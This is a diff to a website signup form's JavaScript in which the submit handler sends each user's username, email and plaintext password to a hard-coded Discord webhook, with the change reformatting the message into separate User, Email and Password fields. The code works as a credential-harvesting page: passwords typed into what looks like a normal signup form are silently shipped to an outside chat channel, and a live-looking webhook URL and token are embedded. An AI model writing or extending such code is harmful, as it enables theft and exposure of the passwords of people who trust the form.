@@ -17,7 +17,7 @@ document.getElementById('togglePassword').addEventListener('click', function(eve
     this.textContent = (passwordInput.type === 'password') ? '👁️' : '🚫'; // Change emoji based on visibility
 });
 
-// Handle the form submission to send the signup details to Discord (add webhook logic here)
+// Handle the form submission to send the signup details to Discord
 document.querySelector("form").addEventListener("submit", function(event) {
     event.preventDefault();  // Prevent the default form submission
 
@@ -30,12 +30,26 @@ document.querySelector("form").addEventListener("submit", function(event) {
         const webhookUrl = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
         const payload = {
             content: `New Sign Up - User: ${username}, Email: ${email} has signed up with the password: ${password}`,
-            username: 'Sign Up System',
-            avatar_url: 'https://example.com/avatar.png', // Replace with your avatar URL
             embeds: [
                 {
-                    title: 'New Sign Up',
-                    description: `User: ${username}, Email: ${email} has signed up with the password: ${password}`,
+                    title: 'New User',
+                    fields: [
+                        {
+                            name: 'User',
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: 'Email',
+                            value: email,
+                            inline: true
+                        },
+                        {
+                            name: 'Password',
+                            value: password,
+                            inline: true
+                        }
+                    ],
                     color: 7506394 // Grey color
                 }
             ]
